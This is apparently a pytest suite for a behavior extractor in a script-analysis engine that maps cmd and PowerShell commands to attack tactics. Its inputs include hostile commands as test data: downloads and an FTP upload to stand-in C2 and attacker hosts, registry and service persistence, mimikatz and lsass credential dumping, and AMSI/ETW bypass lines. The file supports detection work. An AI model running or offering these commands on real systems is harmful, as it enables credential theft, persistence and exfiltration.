"""Phase 4 · Behavior Extractor tests (35 tests).

Reads ONLY the ExecGraph — never raw text (§ 12.2 invariant).
Every behavior emitted carries evidence Node IDs.
"""
import pytest
from engine.exec_graph import (
    Behavior, ExecGraph, ExecNode, NodeKind,
    SideEffect, SideEffectVerb, TacticKind,
)
from engine.detectors.behavior_extractor import extract_behaviors, BehaviorExtractor
from engine.parsers.cmd_parser import CmdParser
from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.cmd_interpreter import CmdInterpreter
from engine.interpreters.powershell_interpreter import PowerShellInterpreter


CP, CI = CmdParser(), CmdInterpreter()
PP, PI = PowerShellParser(), PowerShellInterpreter()


def _from_cmd(src): return CI.interpret(CP.parse(src))
def _from_ps(src): return PI.interpret(PP.parse(src))


def _tactics(bs): return [b.tactic.value for b in bs]
def _subs(bs): return [b.sub_kind for b in bs]


# ── Empty / trivial graphs ──────────────────────────────────────────
def test_empty_graph_emits_no_behaviors():
    assert extract_behaviors(ExecGraph()) == []


def test_only_var_bind_emits_no_behavior():
    g = _from_cmd("SET X=1")
    assert extract_behaviors(g) == []


def test_only_echo_emits_no_behavior():
    g = _from_cmd("echo hi")  # ECHO is string_op, not process
    assert extract_behaviors(g) == []


# ── Execution — process spawn ───────────────────────────────────────
def test_process_spawn_emits_execution():
    g = _from_cmd("start notepad.exe")
    bs = extract_behaviors(g)
    execs = [b for b in bs if b.tactic == TacticKind.execution and b.sub_kind == "process_spawn"]
    assert execs and execs[0].parameters["image"] == "start"


def test_process_spawn_carries_evidence_node_id():
    g = _from_cmd("start notepad.exe")
    bs = extract_behaviors(g)
    node_ids = {n.id for n in g.nodes}
    for b in bs:
        for eid in b.evidence_nodes:
            assert eid in node_ids


def test_process_spawn_confidence_from_node():
    g = _from_ps("Start-Process notepad.exe")
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "process_spawn"]
    assert bs and bs[0].confidence == 100


# ── C2 downloads ────────────────────────────────────────────────────
def test_iwr_emits_c2_download():
    g = _from_ps("Invoke-WebRequest -Uri http://example.com/x")
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "download"]
    assert bs and bs[0].tactic == TacticKind.command_and_control


def test_iwr_extracts_url_hint():
    g = _from_ps("Invoke-WebRequest -Uri http://c2/beacon")
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "download"]
    assert bs and bs[0].parameters.get("url_hint") == "http://c2/beacon"


def test_certutil_download_pattern():
    g = _from_cmd("certutil -urlcache -f https://x/y payload.exe")
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "download"]
    assert bs


def test_curl_alias_normalized_and_download_flagged():
    g = _from_ps("curl http://c2/x")  # curl is aliased to Invoke-WebRequest
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "download"]
    assert bs


def test_bitsadmin_download():
    g = _from_cmd("bitsadmin /transfer job http://c2/f C:\\tmp\\f")
    bs = [b for b in extract_behaviors(g) if b.sub_kind == "download"]
    assert bs


# ── Persistence ─────────────────────────────────────────────────────
def test_schtasks_persistence_task():
    g = _from_cmd("schtasks /Create /SC ONCE /TN evil /TR notepad.exe")
    bs = [b for b in extract_behaviors(g)
          if b.tactic == TacticKind.persistence and b.sub_kind == "create_task"]
    assert bs


def test_reg_write_persistence():
    g = _from_cmd("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\bad.exe")
    bs = extract_behaviors(g)
    # Both `write_registry` and `autorun_registration`
    assert any(b.sub_kind == "write_registry" for b in bs)
    assert any(b.sub_kind == "autorun_registration" for b in bs)


def test_ps_set_itemproperty_run_key():
    g = _from_ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name evil -Value 'C:\\bad.exe'")
    bs = extract_behaviors(g)
    assert any(b.sub_kind in ("write_registry", "autorun_registration") for b in bs)


def test_sc_service_install():
    g = _from_cmd("sc create evilsvc binPath= C:\\bad.exe start= auto")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "install_service" for b in bs)


# ── Credential access ──────────────────────────────────────────────
def test_mimikatz_dump_credentials():
    g = _from_cmd("mimikatz.exe privilege::debug sekurlsa::logonpasswords")
    bs = extract_behaviors(g)
    assert any(b.tactic == TacticKind.credential_access and b.sub_kind == "dump_credentials"
               for b in bs)


def test_procdump_dump_credentials():
    g = _from_cmd("procdump -ma lsass.exe lsass.dmp")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "dump_credentials" for b in bs)


# ── Defense evasion — AMSI / ETW / encoded ─────────────────────────
def test_amsi_bypass_behavior():
    g = _from_ps("Set-Variable -Name amsiInitFailed -Value $true")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "bypass_amsi" and b.tactic == TacticKind.defense_evasion
               for b in bs)


def test_etw_bypass_behavior():
    g = _from_ps("Set-Variable -Name EtwEventWrite -Value $true")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "bypass_etw" for b in bs)


def test_encoded_command_obfuscation_behavior():
    import base64
    b64 = base64.b64encode("Get-Process".encode("utf-16le")).decode()
    g = _from_ps(f"powershell.exe -Enc {b64}")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "obfuscation" and b.tactic == TacticKind.defense_evasion
               for b in bs)


# ── Upload / exfiltration ──────────────────────────────────────────
def test_ftp_upload():
    g = _from_cmd("ftp -s:script.txt attacker.com")
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "upload" and b.tactic == TacticKind.exfiltration for b in bs)


# ── Deterministic / evidence integrity ─────────────────────────────
def test_same_graph_produces_same_behaviors():
    g1 = _from_cmd("start notepad.exe")
    g2 = _from_cmd("start notepad.exe")
    b1 = extract_behaviors(g1)
    b2 = extract_behaviors(g2)
    assert [(b.tactic, b.sub_kind, b.reconstructed) for b in b1] == \
           [(b.tactic, b.sub_kind, b.reconstructed) for b in b2]


def test_behaviors_are_frozen():
    g = _from_cmd("start notepad.exe")
    bs = extract_behaviors(g)
    from pydantic import ValidationError
    with pytest.raises(ValidationError):
        bs[0].confidence = 10


def test_every_behavior_has_at_least_one_evidence_node():
    g = _from_cmd("start notepad.exe")
    bs = extract_behaviors(g)
    assert bs and all(len(b.evidence_nodes) >= 1 for b in bs)


def test_evidence_node_ids_all_resolve():
    g = _from_ps("Invoke-WebRequest -Uri http://c2/x\nStart-Process notepad.exe")
    bs = extract_behaviors(g)
    known = {n.id for n in g.nodes}
    for b in bs:
        for eid in b.evidence_nodes:
            assert eid in known, f"dangling evidence ref: {eid}"


# ── No raw-text parsing — read only structured args ────────────────
def test_extractor_does_not_read_raw_output():
    # We prove this by using a graph where reconstructed text contains
    # "reg add HKCU\...\Run" but node args do NOT — the extractor should
    # NOT infer autorun_registration from reconstruction text.
    n = ExecNode(
        kind=NodeKind.process,
        args={"image": "customproc", "args": []},   # no "reg" image, no Run marker
        reconstructed="reg add HKCU\\Software\\...\\Run /v evil /d C:\\bad.exe",
        parser="cmd",
    )
    g = ExecGraph().add_node(n)
    bs = extract_behaviors(g)
    # Should be only "process_spawn" — never "autorun_registration"
    subs = [b.sub_kind for b in bs]
    assert "autorun_registration" not in subs
    assert "write_registry" not in subs
    assert subs == ["process_spawn"]


# ── Advisor-origin nodes are ignored ───────────────────────────────
def test_advisor_origin_nodes_ignored():
    # A deterministic ProcessNode + an advisor-origin one; only the
    # deterministic one produces a behavior.
    n_det = ExecNode(kind=NodeKind.process,
                     args={"image": "notepad.exe", "args": []},
                     reconstructed="Start-Process notepad.exe",
                     parser="powershell")
    n_adv = ExecNode(kind=NodeKind.process, origin="advisor",
                     args={"image": "mimikatz.exe", "args": []},
                     reconstructed="AI narrative: mimikatz",
                     parser="powershell")
    g = ExecGraph().add_node(n_det).add_node(n_adv)
    bs = extract_behaviors(g)
    # No credential-access from advisor node
    assert not any(b.sub_kind == "dump_credentials" for b in bs)
    # But process_spawn only from deterministic node
    exec_bs = [b for b in bs if b.sub_kind == "process_spawn"]
    assert len(exec_bs) == 1
    assert exec_bs[0].evidence_nodes == (n_det.id,)


# ── Multiple behaviors per node (compound findings) ────────────────
def test_reg_with_run_key_emits_both_write_and_autorun():
    g = _from_cmd("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d C:\\bad.exe")
    subs = [b.sub_kind for b in extract_behaviors(g)]
    # Both must appear alongside the base process_spawn
    assert "process_spawn" in subs
    assert "write_registry" in subs
    assert "autorun_registration" in subs


def test_powershell_encoded_download_double_tag():
    import base64
    inner = "Invoke-WebRequest -Uri http://c2/x"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _from_ps(f"powershell.exe -Enc {b64}")
    bs = extract_behaviors(g)
    subs = [b.sub_kind for b in bs]
    # Both the obfuscation tag (encoded_command) and the inner C2 download
    assert "obfuscation" in subs
    assert "download" in subs


# ── Confidence propagation from node → behavior ────────────────────
def test_low_confidence_node_produces_low_confidence_behavior():
    n = ExecNode(kind=NodeKind.process,
                 args={"image": "custom", "args": []},
                 reconstructed="custom",
                 confidence=40, parser="cmd")
    g = ExecGraph().add_node(n)
    bs = extract_behaviors(g)
    assert bs and bs[0].confidence == 40


# ── Registry / Task / Service structured node kinds ────────────────
def test_registry_node_emits_write_registry():
    n = ExecNode(
        kind=NodeKind.registry,
        args={"key": "HKCU\\Software\\X", "value": "y"},
        reconstructed="reg add ...",
        parser="cmd",
        side_effects=(),
    )
    g = ExecGraph().add_node(n)
    bs = extract_behaviors(g)
    assert any(b.sub_kind == "write_registry" for b in bs)


def test_scheduled_task_node_emits_create_task():
    n = ExecNode(kind=NodeKind.scheduled_task, args={"name": "evil"},
                 reconstructed="schtasks ...", parser="cmd")
    bs = extract_behaviors(ExecGraph().add_node(n))
    assert any(b.sub_kind == "create_task" for b in bs)


def test_service_node_emits_install_service():
    n = ExecNode(kind=NodeKind.service, args={"name": "evilsvc"},
                 reconstructed="sc create ...", parser="cmd")
    bs = extract_behaviors(ExecGraph().add_node(n))
    assert any(b.sub_kind == "install_service" for b in bs)


# ── Detector contract & plugin registration ────────────────────────
def test_detector_registered():
    from engine.plugin_api import list_detectors
    ds = list_detectors()
    assert any(d.name == "behavior_extractor" for d in ds)


def test_extractor_returns_dict_shape():
    g = _from_cmd("start notepad.exe")
    out = BehaviorExtractor().detect(g)
    assert isinstance(out, dict)
    assert "behaviors" in out
    assert all(isinstance(b, Behavior) for b in out["behaviors"])
